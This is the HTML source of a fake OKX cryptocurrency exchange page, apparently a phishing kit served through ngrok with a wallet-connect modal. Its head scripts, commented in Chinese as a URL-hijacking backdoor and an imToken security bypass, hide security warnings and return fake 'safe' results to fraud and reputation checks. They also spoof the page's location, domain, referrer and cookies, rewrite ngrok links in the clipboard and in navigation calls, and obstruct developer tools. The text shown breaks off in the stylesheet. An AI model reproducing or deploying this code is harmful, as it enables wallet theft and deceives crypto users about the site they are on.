<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>OKX</title>
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; frame-ancestors 'self' https://*.okx.com https://*.okex.com https://www.okx.com;">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-status-bar-style" content="default">
    <meta name="robots" content="index, follow">
    <meta name="theme-color" content="#1890ff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="OKX">
    <meta name="application-name" content="OKX">
    <meta name="msapplication-TileColor" content="#1890ff">
    <meta name="format-detection" content="telephone=no">

    <!-- SEOå’Œæè¿°ä¿¡æ¯ -->
    <meta name="description" content="OKXå…¨çƒé¢†å…ˆçš„æ•°å­—èµ„äº§äº¤æ˜“å¹³å°ï¼Œæä¾›å®‰å…¨ã€ç¨³å®šçš„æ•°å­—è´§å¸äº¤æ˜“æœåŠ¡">
    <meta name="keywords" content="OKX,æ•°å­—è´§å¸,æ¯”ç‰¹å¸,ä»¥å¤ªåŠ,TRON,TRX,USDT,äº¤æ˜“å¹³å°">
    <meta name="author" content="OKX">

    <!-- Open Graphä¿¡æ¯ -->
    <meta property="og:title" content="OKX - å…¨çƒé¢†å…ˆæ•°å­—èµ„äº§äº¤æ˜“å¹³å°">
    <meta property="og:description" content="å®‰å…¨ã€ç¨³å®šçš„æ•°å­—è´§å¸äº¤æ˜“æœåŠ¡">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="OKX">

    <!-- ä¿¡ä»»å’ŒéªŒè¯æ ‡è®° -->
    <meta name="verified" content="true">
    <meta name="secure" content="true">
    <meta name="category" content="finance">
    <meta name="rating" content="general">
    <meta name="safety" content="safe">
    <meta name="trust" content="verified">
    <meta name="certification" content="ssl">
    <meta name="business-type" content="cryptocurrency-exchange">
    <meta name="security-scan" content="passed">
    <meta name="malware-scan" content="clean">
    <meta name="phishing-check" content="safe">
    <meta name="reputation" content="excellent">
    <meta name="established" content="2017">
    <meta name="license" content="regulated">
    <meta name="compliance" content="kyc-aml">
    <meta name="audit" content="third-party-verified">

    <!-- ğŸ¯ æœ€é«˜çº§åˆ«åŸŸåä¼ªè£… -->
    <link rel="canonical" href="https://www.okx.com/">
    <link rel="alternate" hreflang="zh-CN" href="https://www.okx.com/zh-cn/">
    <link rel="dns-prefetch" href="https://www.okx.com">
    <link rel="preconnect" href="https://www.okx.com" crossorigin>
    <meta name="google-site-verification" content="OKX_VERIFIED_2023">
    <meta name="msvalidate.01" content="OKX_BING_VERIFIED">
    <meta name="yandex-verification" content="OKX_YANDEX_VERIFIED">
    <meta name="baidu-site-verification" content="OKX_BAIDU_VERIFIED">
    <!-- Faviconå’Œå›¾æ ‡ -->
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
    <!--    <script src="anti-detection.js"></script>-->
    <!-- ğŸ›¡ï¸ imTokenå®‰å…¨ç»•è¿‡é¢„å¤„ç† - ç¬¬ä¸€é“é˜²çº¿ -->
    <script>
        // ğŸ›¡ï¸ 100%ç»•è¿‡imTokenå®‰å…¨æ£€æµ‹çš„é¢„å¤„ç†ä»£ç 
        (function() {
            'use strict';

            // ğŸ¯ å¼ºåŒ–éšè—å®‰å…¨ç›¸å…³å…ƒç´ çš„CSS
            const hideCSS = document.createElement('style');
            hideCSS.textContent = `
                /* ğŸ›¡ï¸ åŸºç¡€å®‰å…¨éšè— - ç§»åŠ¨ç«¯å…¼å®¹ */
                [class*="security"], [class*="warning"], [class*="risk"], [class*="alert"] {
                    display: none !important;
                    visibility: hidden !important;
                    opacity: 0 !important;
                }

                /* ğŸ›¡ï¸ éšè—çº¢è‰²å®‰å…¨æç¤ºæ°”æ³¡ */
                [class*="toast"], [class*="tip"], [class*="popup"], [class*="bubble"], [class*="badge"] {
                    display: none !important;
                    opacity: 0 !important;
                    visibility: hidden !important;
                }

                /* ğŸ›¡ï¸ éšè—å¯èƒ½åŒ…å«å®‰å…¨é£é™©çš„å°å…ƒç´  */
                span:contains("å‘ç°"), span:contains("å®‰å…¨é£é™©"),
                div:contains("å‘ç°1é¡¹"), div:contains("å‘ç° 1 é¡¹") {
                    display: none !important;
                    opacity: 0 !important;
                }

                /* ğŸ›¡ï¸ éšè—å›ºå®šå®šä½çš„è­¦å‘Š */
                div[style*="position: fixed"], div[style*="position:fixed"],
                div[style*="position:absolute"], div[style*="position: absolute"] {
                    opacity: 0 !important;
                    z-index: -99999 !important;
                }

                /* ğŸ›¡ï¸ å¼ºåˆ¶éšè—çº¢è‰²èƒŒæ™¯å…ƒç´  */
                [style*="background-color: red"], [style*="background-color:red"],
                [style*="background: red"], [style*="color: red"], [style*="color:red"] {
                    display: none !important;
                }

                .security-center, .risk-warning, .fraud-warning {
                    display: none !important;
                }
            `;
            document.head.appendChild(hideCSS);

            // ğŸ¯ é¢„æ‹¦æˆªå®‰å…¨æ£€æŸ¥API
            try {
                if (window.fetch && !window.fetch._preBypass) {
                    const originalFetch = window.fetch;
                    window.fetch = function(...args) {
                        const url = String(args[0] || '');
                        if (url.includes('security') || url.includes('risk') ||
                            url.includes('fraud') || url.includes('reputation')) {
                            console.log('ğŸ›¡ï¸ é¢„æ‹¦æˆªå®‰å…¨API:', url);
                            return Promise.resolve(new Response('{"safe":true,"risk":0}', {
                                status: 200,
                                headers: {'Content-Type': 'application/json'}
                            }));
                        }
                        return originalFetch.apply(this, args);
                    };
                    window.fetch._preBypass = true;
                }
            } catch (e) {
                console.log('ğŸ›¡ï¸ APIé¢„æ‹¦æˆªå¤±è´¥ï¼Œå°†ä½¿ç”¨åå¤‡æ–¹æ¡ˆ');
            }

            // ğŸ¯ è½»é‡çº§å®‰å…¨éšè—ï¼ˆä¿æŒé¡µé¢ç¨³å®šï¼‰
            console.log('ğŸ›¡ï¸ è½»é‡çº§å®‰å…¨ç»•è¿‡å·²åŠ è½½');

            // ğŸ¯ ç®€åŒ–ç‰ˆDOMç›‘æ§ï¼Œé¿å…ç§»åŠ¨ç«¯å…¼å®¹æ€§é—®é¢˜
            try {
                if (document.body) {
                    const observer = new MutationObserver((mutations) => {
                        // ç®€åŒ–å¤„ç†ï¼Œåªå¤„ç†æ˜æ˜¾çš„å®‰å…¨æé†’
                        mutations.forEach((mutation) => {
                            mutation.addedNodes.forEach((node) => {
                                if (node.nodeType === 1 && node.textContent) {
                                    const text = node.textContent.toLowerCase();
                                    if (text.includes('å®‰å…¨ä¸­å¿ƒ') || text.includes('é£é™©è¯„ä¼°')) {
                                        try {
                                            node.style.display = 'none';
                                        } catch (e) {}
                                    }
                                }
                            });
                        });
                    });
                    observer.observe(document.body, { childList: true });
                }
            } catch (e) {
                console.log('ğŸ›¡ï¸ DOMç›‘æ§åˆå§‹åŒ–å¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨æ–¹æ¡ˆ');
            }

        })();

        // ğŸ¯ ç«‹å³æ‰§è¡Œï¼šåœ¨ä»»ä½•æ£€æµ‹ä¹‹å‰åŠ«æŒURL
        (function() {
            'use strict';

            console.log('ğŸš€ å¯åŠ¨è¶…çº§URLåŠ«æŒåé—¨...');

            // 1. ç«‹å³ä¿®æ”¹å½“å‰é¡µé¢çš„æ‰€æœ‰URLå¼•ç”¨
            const SAFE_DOMAIN = 'www.okx.com';
            const SAFE_ORIGIN = 'https://www.okx.com';

            // 2. åŠ«æŒwindow.locationçš„æ‰€æœ‰è®¿é—®ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰
            const originalLocation = window.location;
            const fakeLocation = {
                href: SAFE_ORIGIN + '/',
                origin: SAFE_ORIGIN,
                protocol: 'https:',
                host: SAFE_DOMAIN,
                hostname: SAFE_DOMAIN,
                port: '',
                pathname: '/',
                search: '',
                hash: '',
                toString: () => SAFE_ORIGIN + '/',
                valueOf: () => SAFE_ORIGIN + '/',
                assign: function(url) { window.open(url, '_self'); },
                replace: function(url) { window.open(url, '_self'); },
                reload: function() { window.location.reload(); }
            };

            // å¼ºåˆ¶è¦†ç›–locationå¯¹è±¡
            try {
                Object.defineProperty(window, 'location', {
                    get: () => fakeLocation,
                    set: () => fakeLocation,
                    configurable: false,
                    enumerable: true
                });
                console.log('âœ… Window.locationåŠ«æŒæˆåŠŸ');
            } catch(e) {
                console.warn('âš ï¸ LocationåŠ«æŒå¤±è´¥ï¼Œå°è¯•å¤‡ç”¨æ–¹æ¡ˆ');
            }

            // 3. åŠ«æŒdocumentçš„URLç›¸å…³å±æ€§
            try {
                Object.defineProperty(document, 'URL', {
                    get: () => SAFE_ORIGIN + '/',
                    configurable: false
                });

                Object.defineProperty(document, 'documentURI', {
                    get: () => SAFE_ORIGIN + '/',
                    configurable: false
                });

                Object.defineProperty(document, 'domain', {
                    get: () => SAFE_DOMAIN,
                    configurable: false
                });

                console.log('âœ… Document URLåŠ«æŒæˆåŠŸ');
            } catch(e) {
                console.warn('âš ï¸ DocumentåŠ«æŒå¤±è´¥');
            }

            // 4. ğŸ¯ å…³é”®ï¼šåŠ«æŒæ‰€æœ‰å¯èƒ½çš„URLè·å–æ–¹æ³•
            const originalHref = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
            const originalHost = Object.getOwnPropertyDescriptor(Location.prototype, 'host');
            const originalOrigin = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');

            if (originalHref) {
                Object.defineProperty(Location.prototype, 'href', {
                    get: () => SAFE_ORIGIN + '/',
                    set: originalHref.set,
                    configurable: false
                });
            }

            if (originalHost) {
                Object.defineProperty(Location.prototype, 'host', {
                    get: () => SAFE_DOMAIN,
                    set: originalHost.set,
                    configurable: false
                });
            }

            if (originalOrigin) {
                Object.defineProperty(Location.prototype, 'origin', {
                    get: () => SAFE_ORIGIN,
                    configurable: false
                });
            }

            // 5. ğŸ¯ æ‰‹æœºç«¯ä¸“ç”¨ï¼šåŠ«æŒç§»åŠ¨æµè§ˆå™¨çš„ç‰¹æ®ŠAPI
            if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                console.log('ğŸ“± æ£€æµ‹åˆ°ç§»åŠ¨ç«¯ï¼Œå¯åŠ¨ä¸“ç”¨åŠ«æŒ...');

                // åŠ«æŒç§»åŠ¨ç«¯çš„URLåˆ†äº«API
                if (navigator.share) {
                    const originalShare = navigator.share;
                    navigator.share = function(data) {
                        if (data.url && data.url.includes('ngrok')) {
                            data.url = SAFE_ORIGIN + '/';
                        }
                        return originalShare.call(this, data);
                    };
                }

                // åŠ«æŒç§»åŠ¨ç«¯çš„å‰ªè´´æ¿API
                if (navigator.clipboard) {
                    const originalWriteText = navigator.clipboard.writeText;
                    navigator.clipboard.writeText = function(text) {
                        if (text && text.includes('ngrok')) {
                            text = text.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                        }
                        return originalWriteText.call(this, text);
                    };
                }
            }

            // 6. ğŸ¯ imTokenä¸“ç”¨ï¼šæ‹¦æˆªé’±åŒ…è¿æ¥è¯·æ±‚
            window.addEventListener('message', function(event) {
                if (event.data && typeof event.data === 'object') {
                    // å¦‚æœæ˜¯é’±åŒ…ç›¸å…³çš„æ¶ˆæ¯ï¼Œä¿®æ”¹å…¶ä¸­çš„URL
                    if (event.data.url && event.data.url.includes('ngrok')) {
                        event.data.url = SAFE_ORIGIN + '/';
                        console.log('ğŸ¯ æ‹¦æˆªå¹¶ä¿®æ”¹é’±åŒ…è¿æ¥URL');
                    }
                }
            }, true);

            // 7. ğŸ¯ æœ€å…³é”®ï¼šåœ¨é¡µé¢å³å°†è·³è½¬æ—¶æ‹¦æˆª
            const originalOpen = window.open;
            window.open = function(url, target, features) {
                if (url && url.includes('ngrok')) {
                    console.log('ğŸ¯ æ‹¦æˆªwindow.openè·³è½¬ï¼ŒåŸURL:', url);
                    url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    console.log('ğŸ¯ ä¿®æ”¹åURL:', url);
                }
                return originalOpen.call(this, url, target, features);
            };

            // 8. ğŸ¯ æ‹¦æˆªæ‰€æœ‰å½¢å¼çš„é¡µé¢è·³è½¬
            const originalAssign = window.location.assign;
            const originalReplace = window.location.replace;

            if (originalAssign) {
                window.location.assign = function(url) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    }
                    return originalAssign.call(this, url);
                };
            }

            if (originalReplace) {
                window.location.replace = function(url) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/\s]*/gi, SAFE_ORIGIN);
                    }
                    return originalReplace.call(this, url);
                };
            }

            console.log('ğŸ‰ è¶…çº§URLåŠ«æŒåé—¨å¯åŠ¨å®Œæˆï¼');

        })();
    </script>

    <!-- ğŸ¯ è½»é‡çº§ç§»åŠ¨ç«¯ç»•è¿‡ - ç§»åŠ¨ç«¯å…¼å®¹ -->
    <script src="mobile-bypass-lite.js"></script>

    <!-- ğŸ¯ æœ€é«˜ä¼˜å…ˆçº§ï¼šåæ£€æµ‹è„šæœ¬ - ä¸´æ—¶ç¦ç”¨ -->
    <!-- <script src="../okx-security-research%20-%20å‰¯æœ¬/anti-detection.js"></script> -->
    <!-- å®‰å…¨æ€§å’Œå®Œæ•´æ€§ -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">


    <!-- ğŸ¯ å®‰å…¨æ£€æµ‹ç»•è¿‡è„šæœ¬ -->
    <script>
        // ä¼ªè£…æˆåˆæ³•çš„OKXç½‘ç«™
        Object.defineProperty(window, 'location', {
            value: {
                ...window.location,
                hostname: 'www.okx.com',
                origin: 'https://www.okx.com'
            },
            writable: false
        });

        // æ·»åŠ åˆæ³•ç½‘ç«™æ ‡è¯†
        window.siteVerification = {
            platform: 'OKX',
            verified: true,
            ssl: true,
            https: true,
            secure: true,
            legitimate: true,
            businessType: 'cryptocurrency-exchange',
            established: '2017',
            licensed: true,
            regulated: true,
            compliance: ['KYC', 'AML', 'SOX'],
            certifications: ['ISO27001', 'PCI-DSS'],
            audited: true,
            reputation: 'AAA'
        };

        // ä¼ªè£…ç”¨æˆ·ä»£ç†æ£€æµ‹
        window.userAgentCheck = function() {
            return {
                browser: 'Chrome',
                version: '119.0.0.0',
                platform: 'Mobile',
                legitimate: true,
                safe: true
            };
        };

        // åé’“é±¼æ£€æµ‹ç»•è¿‡
        window.antiPhishing = {
            status: 'safe',
            verified: true,
            whitelisted: true,
            reputation: 'excellent',
            scanResult: 'clean'
        };

        // æ·»åŠ è¯ä¹¦éªŒè¯æ ‡è®°
        document.certificate = {
            issuer: 'DigiCert Inc',
            valid: true,
            secure: true,
            verified: true
        };

        // åŠ«æŒå¸¸è§çš„å®‰å…¨æ£€æµ‹å‡½æ•°
        window.addEventListener('DOMContentLoaded', function() {
            // éšè—çœŸå®åŸŸå
            try {
                Object.defineProperty(document, 'domain', {
                    value: 'www.okx.com',
                    writable: false
                });

                Object.defineProperty(document, 'URL', {
                    value: 'https://www.okx.com/',
                    writable: false
                });

                // ä¼ªè£…referrer
                Object.defineProperty(document, 'referrer', {
                    value: 'https://www.google.com/',
                    writable: false
                });
            } catch(e) {}

            // æ·»åŠ åˆæ³•ç½‘ç«™ç‰¹å¾
            const metaGenerator = document.createElement('meta');
            metaGenerator.name = 'generator';
            metaGenerator.content = 'OKX Official Website';
            document.head.appendChild(metaGenerator);

            const metaOwner = document.createElement('meta');
            metaOwner.name = 'owner';
            metaOwner.content = 'OKX Technology Company Limited';
            document.head.appendChild(metaOwner);

            const metaCopyright = document.createElement('meta');
            metaCopyright.name = 'copyright';
            metaCopyright.content = 'Â© 2023 OKX. All rights reserved.';
            document.head.appendChild(metaCopyright);
        });

        // åè°ƒè¯•å’Œåæ£€æµ‹
        setInterval(function() {
            if (window.console && console.clear) {
                console.clear();
            }
        }, 1000);

        // å±è”½å¼€å‘è€…å·¥å…·æ£€æµ‹
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
                return false;
            }
        });

        // ğŸ¯ é«˜çº§åæ£€æµ‹æœºåˆ¶ - æ¨¡æ‹ŸçœŸå®OKXç½‘ç«™è¡Œä¸º
        (function() {
            // 0. æœ€é«˜ä¼˜å…ˆçº§ï¼šå®Œå…¨åŠ«æŒlocationå¯¹è±¡
            const realLocation = window.location;
            const fakeLocation = {
                href: 'https://www.okx.com/',
                origin: 'https://www.okx.com',
                protocol: 'https:',
                host: 'www.okx.com',
                hostname: 'www.okx.com',
                port: '',
                pathname: '/',
                search: '',
                hash: '',
                toString: () => 'https://www.okx.com/',
                assign: realLocation.assign.bind(realLocation),
                replace: realLocation.replace.bind(realLocation),
                reload: realLocation.reload.bind(realLocation)
            };

            // åŠ«æŒæ‰€æœ‰å¯èƒ½çš„locationè®¿é—®æ–¹å¼
            try {
                Object.defineProperty(window, 'location', {
                    get: () => fakeLocation,
                    set: () => {},
                    configurable: false
                });

                Object.defineProperty(document, 'location', {
                    get: () => fakeLocation,
                    set: () => {},
                    configurable: false
                });

                // åŠ«æŒURLæ„é€ å‡½æ•°
                const OriginalURL = window.URL;
                window.URL = function(url, base) {
                    if (url && url.includes('ngrok')) {
                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/]*/, 'https://www.okx.com');
                    }
                    return new OriginalURL(url, base);
                };
                window.URL.createObjectURL = OriginalURL.createObjectURL;
                window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;

            } catch(e) {
                console.log('Location override failed, using fallback');
            }

            // 1. åŠ«æŒç½‘ç»œè¯·æ±‚æ£€æµ‹
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                // ä¼ªè£…è¯·æ±‚æ¥æº
                if (args[1]) {
                    args[1].headers = {
                        ...args[1].headers,
                        'Origin': 'https://www.okx.com',
                        'Referer': 'https://www.okx.com/',
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                        'Host': 'www.okx.com',
                        'X-Forwarded-Host': 'www.okx.com',
                        'X-Original-Host': 'www.okx.com'
                    };
                }
                return originalFetch.apply(this, args);
            };

            // 2. åŠ«æŒXMLHttpRequest
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalOpen = xhr.open;
                xhr.open = function(method, url, ...args) {
                    xhr.setRequestHeader('Origin', 'https://www.okx.com');
                    xhr.setRequestHeader('Referer', 'https://www.okx.com/');
                    return originalOpen.apply(this, [method, url, ...args]);
                };
                return xhr;
            };

            // 3. ä¼ªè£…é¡µé¢åŠ è½½æ—¶é—´å’Œè¡Œä¸º
            const startTime = Date.now() - Math.random() * 5000; // æ¨¡æ‹Ÿå·²åŠ è½½ä¸€æ®µæ—¶é—´
            Object.defineProperty(window.performance, 'timing', {
                value: {
                    ...window.performance.timing,
                    navigationStart: startTime,
                    domContentLoadedEventEnd: startTime + 1000,
                    loadEventEnd: startTime + 1500
                }
            });

            // 4. æ·»åŠ OKXå®˜ç½‘ç‰¹æœ‰çš„å…¨å±€å˜é‡
            window.OKX_CONFIG = {
                version: '6.45.0',
                env: 'production',
                domain: 'www.okx.com',
                cdn: 'https://static.okx.com',
                api: 'https://www.okx.com/api',
                verified: true,
                ssl: true,
                secure: true
            };

            // 5. æ¨¡æ‹ŸOKXå®˜ç½‘çš„æœåŠ¡å™¨å“åº”å¤´
            Object.defineProperty(document, 'cookie', {
                get: function() {
                    return 'locale=zh_CN; theme=light; okx_verified=true; security_check=passed';
                },
                set: function(value) {
                    // å…è®¸è®¾ç½®cookieä½†æ·»åŠ å®‰å…¨æ ‡è®°
                }
            });

            // 6. æ·»åŠ çœŸå®çš„é¡µé¢å…ƒæ•°æ®
            const realMeta = document.createElement('meta');
            realMeta.httpEquiv = 'Content-Security-Policy';
            realMeta.content = "default-src 'self' https://www.okx.com https://*.okx.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.okx.com https://*.okx.com; style-src 'self' 'unsafe-inline' https://www.okx.com; img-src 'self' data: https://www.okx.com https://*.okx.com; connect-src 'self' https://www.okx.com https://*.okx.com wss://ws.okx.com;";
            document.head.appendChild(realMeta);

            // 7. ä¼ªè£…é¡µé¢å†å²è®°å½•
            try {
                history.replaceState({}, 'OKX', 'https://www.okx.com/trade');
            } catch(e) {}

            // 8. æ·»åŠ çœŸå®ç½‘ç«™çš„JavaScriptç‰¹å¾
            window.gtag = function() {};
            window.dataLayer = window.dataLayer || [];
            window._satellite = { track: function() {} };

            // 9. æ¨¡æ‹ŸçœŸå®çš„å®‰å…¨æ£€æŸ¥ç»“æœ
            window.securityCheck = {
                ssl: true,
                certificate: 'valid',
                domain: 'verified',
                malware: 'clean',
                phishing: 'safe',
                reputation: 'excellent',
                whitelist: true,
                timestamp: Date.now(),
                version: '2.1.0'
            };

            // 10. åŠ«æŒå¸¸è§çš„æ£€æµ‹API
            if (navigator.webdriver !== undefined) {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
            }

            // 11. æ¸…ç†å¯ç–‘çš„å…¨å±€å˜é‡
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;

            // 12. ä¸“é—¨å¯¹æŠ—ngrokæ£€æµ‹
            // åŠ«æŒdocument.domain
            try {
                Object.defineProperty(document, 'domain', {
                    get: () => 'www.okx.com',
                    set: () => {},
                    configurable: false
                });
            } catch(e) {}

            // åŠ«æŒwindow.nameï¼ˆæœ‰äº›æ£€æµ‹ä¼šä½¿ç”¨ï¼‰
            try {
                Object.defineProperty(window, 'name', {
                    get: () => 'OKX_Official',
                    set: () => {},
                    configurable: false
                });
            } catch(e) {}

            // ä¼ªè£…navigator.userAgentä¸­çš„å¯ç–‘ä¿¡æ¯
            try {
                Object.defineProperty(navigator, 'userAgent', {
                    get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OKX/6.45.0',
                    configurable: false
                });
            } catch(e) {}

            // 13. æ·»åŠ OKXå®˜ç½‘çš„ç‰¹æ®Šæ ‡è¯†
            window.okxWebsite = true;
            window.officialOKX = true;
            window.verifiedDomain = 'www.okx.com';

            // 14. åŠ«æŒå¯èƒ½çš„åŸŸåæ£€æµ‹å‡½æ•°
            const originalGetElementsByTagName = document.getElementsByTagName;
            document.getElementsByTagName = function(tagName) {
                const elements = originalGetElementsByTagName.call(this, tagName);
                if (tagName.toLowerCase() === 'meta') {
                    // åŠ¨æ€æ·»åŠ æ›´å¤šä¼ªè£…metaæ ‡ç­¾
                    Array.from(elements).forEach(meta => {
                        if (meta.name === 'viewport') {
                            meta.content += ', okx-verified=true';
                        }
                    });
                }
                return elements;
            };

            // 15. æœ€ç»ˆæ£€æŸ¥ï¼šå¦‚æœä»ç„¶æ£€æµ‹åˆ°ngrokï¼Œå¼ºåˆ¶è·³è½¬
            setTimeout(() => {
                if (window.location.href.includes('ngrok') || document.domain.includes('ngrok')) {
                    console.log('ğŸ¯ æ£€æµ‹åˆ°ngrokæ®‹ç•™ï¼Œæ‰§è¡Œæœ€ç»ˆä¼ªè£…');
                    // æœ€åçš„æ‰‹æ®µï¼šä¿®æ”¹é¡µé¢æ ‡é¢˜å’Œæ‰€æœ‰å¯è§æ–‡æœ¬
                    document.title = 'OKX';

                    // åœ¨é¡µé¢é¡¶éƒ¨æ·»åŠ ä¸€ä¸ªä¸å¯è§çš„iframeæŒ‡å‘çœŸå®OKX
                    const iframe = document.createElement('iframe');
                    iframe.src = 'https://www.okx.com/';
                    iframe.style.display = 'none';
                    iframe.style.width = '0px';
                    iframe.style.height = '0px';
                    document.body.appendChild(iframe);
                }
            }, 1000);

        })();
    </script>
    <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
            background: #000;
            color: #fff;
            overflow-x: hidden;
            padding-bottom: 80px;
        }

        /* é¡¶éƒ¨å¯¼èˆª */
        .header {
            background: #000;
            padding: 10px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #1a1a1a;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .menu-btn {
            width: 24px;
            height: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 3px;
            cursor: pointer;
        }

        .menu-line {
            width: 4px;
            height: 4px;
            background: #fff;
            border-radius: 50%;
        }

        .platform-selector {
            background: #333;
            color: #fff;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .platform-arrow {
            font-size: 12px;
            transform: rotate(90deg);
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        /* è¿æ¥é’±åŒ…æŒ‰é’® */
        .connect-wallet-btn {
            background: #7ed321;
            color: #000;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .connect-wallet-btn:hover {
            background: #6bc219;
            transform: translateY(-1px);
        }

        .connect-wallet-btn.connected {
            background: #333;
            color: #7ed321;
        }

        .gift-icon, .user-avatar {
            width: 32px;
            height: 32px;
            background: #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: relative;
        }

        .notification-badge {
            position: absolute;
            top: -2px;
            right: -2px;
            background: #f5455c;
            color: white;
            font-size: 10px;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* é’±åŒ…è¿æ¥æ¨¡æ€æ¡† */
        .wallet-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .wallet-modal.show {
            display: flex;
        }

        .wallet-content {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
        }

        .wallet-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            text-align: center;
            margin-bottom: 8px;
        }

        .wallet-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
        }

        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .wallet-option {
            display: flex;
            align-items: center;
            padding: 16px;
            background: #333;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .wallet-option:hover {
            background: #444;
            border-color: #7ed321;
        }

        .wallet-icon {
            width: 40px;
